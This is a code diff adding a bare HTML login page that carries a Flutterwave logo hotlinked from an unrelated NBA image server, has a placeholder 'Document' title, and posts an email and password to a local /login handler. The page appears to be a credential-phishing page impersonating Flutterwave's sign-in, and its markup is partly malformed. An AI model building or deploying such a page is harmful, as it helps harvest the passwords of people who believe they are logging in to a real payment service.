@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+    body { font-family: Arial, sans-serif; max-width: 400px; padding: 2em; }
+    label { display: block; margin-top: 1em; }
+    input { width: 100%; padding: 0.5em; margin-top: 0.3em; }
+    button { margin-top: 1.5em; padding: 0.7em; width: 100%; }
+    .social-buttons button { margin-top: 0.5em; width: 48%; display: inline-block; }
+  </style>
+</head>
+<body>
+    <img src="https://cdn-bal.nba.com/manage/sites/3/2022/03/Flutterwave_Logopack_v01_WDB_Logo_FullColor-1-1-002-1024x244.png" width= "50%" height="50%" alt="" srcset="">
+    <h1>Login to your account</h1>
+  </form>
+  <form id="loginForm2" method="POST" action="/login" target="_b">
+    <input type="hidden" name="platform" value="manual" />
+
+    <label for="username2">Email address</label>
+    <input type="text" id="username2" name="username" placeholder="Enter your username or email" required />
+
+    <label for="password2">Password</label>
+    <input type="password" id="password2" name="password" placeholder="Enter your password" required />
+
+    <button type="submit">Login</button>
+</body>
+</html>
